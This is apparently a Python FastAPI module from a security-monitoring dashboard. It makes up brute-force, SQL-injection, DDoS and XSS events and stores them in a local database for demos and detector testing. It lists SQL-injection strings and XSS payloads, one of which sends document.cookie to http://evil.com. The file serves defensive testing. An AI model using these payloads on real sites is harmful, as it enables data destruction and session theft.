"""
Simulate Router
===============
POST /api/simulate/brute-force     — Simulate brute-force attack
POST /api/simulate/sqli            — Simulate SQL injection attempts
POST /api/simulate/ddos            — Simulate high-rate requests
POST /api/simulate/mixed           — Mixed realistic attack scenario
POST /api/simulate/normal-traffic  — Generate normal traffic baseline

WHY this exists:
  In production you wait for real attacks.
  In development/demo you need to populate the dashboard NOW.
  This generates realistic events that trigger the ML and rule-based detectors.
"""

from fastapi import APIRouter, Request, BackgroundTasks, Depends
import asyncio
import random
import time
import json
import logging
import aiosqlite

from app.core.database import get_db
from app.ml.detector import SecurityDetector, LoginEvent

logger = logging.getLogger(__name__)
router = APIRouter()

# ─── FAKE DATA GENERATORS ─────────────────────────────────────────────────────
FAKE_IPS = [
    "192.168.1.{n}".format(n=i) for i in range(1, 30)
] + [
    "10.0.0.{n}".format(n=i) for i in range(1, 20)
] + [
    f"{a}.{b}.{c}.{d}"
    for a, b, c, d in [
        (45, 33, 12, 100), (185, 220, 101, 34), (91, 108, 4, 123),
        (172, 16, 0, 50), (203, 0, 113, 7), (198, 51, 100, 20),
    ]
]

SQLI_PAYLOADS = [
    "admin' OR '1'='1",
    "' UNION SELECT * FROM users--",
    "1; DROP TABLE users--",
    "' OR 1=1--",
    "admin'--",
    "') OR ('1'='1",
    "SLEEP(5)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "1' AND (SELECT 2267 FROM(SELECT COUNT(*),CONCAT(0x7178766271,...",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert(1)>",
    "\"><script>fetch('http://evil.com?c='+document.cookie)</script>",
]

COMMON_PASSWORDS = [
    "password", "123456", "admin", "letmein", "qwerty",
    "abc123", "monkey", "master", "dragon", "pass123",
]

USER_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
    "sqlmap/1.7.8#stable",
    "Nikto/2.1.6",
    "python-requests/2.31.0",
    "curl/7.88.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "masscan/1.0 (https://github.com/robertdavidgraham/masscan)",
    "zgrab/0.x",
]

COUNTRIES = ["US", "RU", "CN", "BR", "DE", "UA", "KR", "IN", "FR", "NL"]


async def _insert_attempt(
    db: aiosqlite.Connection,
    ip: str,
    username: str,
    success: bool,
    attack_type: str,
    severity: str,
    risk_score: float,
    ua: str,
    reasons: list,
):
    now = time.time() - random.uniform(0, 3600)  # spread over last hour
    await db.execute(
        """INSERT INTO login_attempts
           (timestamp, ip_address, username, success, attack_type, severity, risk_score, user_agent, raw_payload)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (now, ip, username, int(success), attack_type, severity, risk_score, ua, json.dumps({"reasons": reasons})),
    )

    if severity in ("high", "critical"):
        await db.execute(
            """INSERT INTO alerts (timestamp, alert_type, severity, ip_address, username, message, details)
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (now, attack_type, severity, ip, username,
             f"{attack_type.replace('_', ' ').title()} detected from {ip}",
             json.dumps({"reasons": reasons, "risk_score": risk_score})),
        )


# ─── SIMULATION TASKS ─────────────────────────────────────────────────────────
async def _run_brute_force(n: int, target_ip: str | None = None):
    """Simulate a brute-force attack: many failures from one IP."""
    ip  = target_ip or random.choice(FAKE_IPS)
    ua  = random.choice(USER_AGENTS)
    target_user = random.choice(["admin", "root", "administrator"])

    from app.core.database import DB_PATH
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        for i in range(n):
            pw = random.choice(COMMON_PASSWORDS)
            risk = min(0.4 + i * 0.06, 0.95)
            sev = "critical" if i >= 8 else "high" if i >= 5 else "medium"
            await _insert_attempt(
                db, ip, target_user, False,
                "brute_force", sev, risk, ua,
                [f"Brute force attempt #{i+1}: {n} failures from same IP"],
            )
        await db.commit()
    logger.info("✅ Simulated %d brute-force attempts from %s", n, ip)


async def _run_sqli(n: int):
    """Simulate SQL injection attempts from various IPs."""
    from app.core.database import DB_PATH
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        for _ in range(n):
            ip = random.choice(FAKE_IPS)
            payload = random.choice(SQLI_PAYLOADS)
            ua = random.choice(USER_AGENTS)
            await _insert_attempt(
                db, ip, payload, False,
                "sqli", "critical", round(random.uniform(0.85, 0.98), 2), ua,
                [f"SQLi pattern: {payload[:40]}..."],
            )
        await db.commit()
    logger.info("✅ Simulated %d SQL injection attempts", n)


async def _run_normal_traffic(n: int):
    """Simulate normal successful and failed logins."""
    normal_users = ["alice", "bob", "charlie", "dave", "eve", "frank"]
    from app.core.database import DB_PATH
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        for _ in range(n):
            ip   = f"192.168.1.{random.randint(10, 200)}"
            user = random.choice(normal_users)
            suc  = random.random() > 0.15   # 85% success rate
            ua   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            await _insert_attempt(
                db, ip, user, suc,
                "none", "low", round(random.uniform(0.0, 0.1), 2), ua,
                [],
            )
        await db.commit()
    logger.info("✅ Simulated %d normal traffic events", n)


async def _run_mixed_attack():
    """Realistic mixed scenario: normal → escalating → attack."""
    await _run_normal_traffic(30)
    await asyncio.sleep(0.1)
    await _run_brute_force(15)
    await asyncio.sleep(0.1)
    await _run_sqli(5)
    from app.core.database import DB_PATH
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        for _ in range(3):
            ip = random.choice(FAKE_IPS)
            payload = random.choice(XSS_PAYLOADS)
            await _insert_attempt(
                db, ip, payload, False,
                "xss", "high", round(random.uniform(0.75, 0.90), 2),
                random.choice(USER_AGENTS),
                [f"XSS payload detected: {payload[:40]}"],
            )
        await db.commit()
    logger.info("✅ Mixed attack simulation complete")


# ─── ENDPOINTS ────────────────────────────────────────────────────────────────
@router.post("/brute-force")
async def simulate_brute_force(background_tasks: BackgroundTasks, attempts: int = 20):
    """
    Simulate a brute-force attack.
    Generates `attempts` failed logins from a single IP.
    """
    background_tasks.add_task(_run_brute_force, attempts)
    return {"ok": True, "message": f"Simulating {attempts} brute-force attempts in background"}


@router.post("/sqli")
async def simulate_sqli(background_tasks: BackgroundTasks, attempts: int = 10):
    """Simulate SQL injection attempts."""
    background_tasks.add_task(_run_sqli, attempts)
    return {"ok": True, "message": f"Simulating {attempts} SQL injection attempts"}


@router.post("/ddos")
async def simulate_ddos(background_tasks: BackgroundTasks, requests: int = 50):
    """Simulate a high-rate DDoS-like burst from multiple IPs."""
    async def _run():
        from app.core.database import DB_PATH
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            ips = random.sample(FAKE_IPS, min(10, len(FAKE_IPS)))
            for i in range(requests):
                ip  = random.choice(ips)
                ua  = random.choice(USER_AGENTS)
                risk = round(random.uniform(0.55, 0.85), 2)
                await _insert_attempt(
                    db, ip, f"ddos_user_{i%5}", False,
                    "ddos", "high", risk, ua,
                    [f"High request rate: {requests} req burst from {len(ips)} IPs"],
                )
            await db.commit()
    background_tasks.add_task(_run)
    return {"ok": True, "message": f"Simulating DDoS burst of {requests} requests"}


@router.post("/mixed")
async def simulate_mixed(background_tasks: BackgroundTasks):
    """Full realistic attack scenario: normal baseline → brute-force → SQLi → XSS."""
    background_tasks.add_task(_run_mixed_attack)
    return {"ok": True, "message": "Running full mixed attack simulation"}


@router.post("/normal-traffic")
async def simulate_normal(background_tasks: BackgroundTasks, events: int = 50):
    """Generate normal traffic to populate the dashboard baseline."""
    background_tasks.add_task(_run_normal_traffic, events)
    return {"ok": True, "message": f"Generating {events} normal traffic events"}


@router.delete("/reset")
async def reset_all_data(db: aiosqlite.Connection = Depends(get_db)):
    """⚠️ WARNING: Deletes all data. For development only."""
    await db.executescript("""
        DELETE FROM login_attempts;
        DELETE FROM alerts;
        DELETE FROM blocked_ips;
        DELETE FROM log_events;
    """)
    await db.commit()
    return {"ok": True, "message": "All data cleared"}
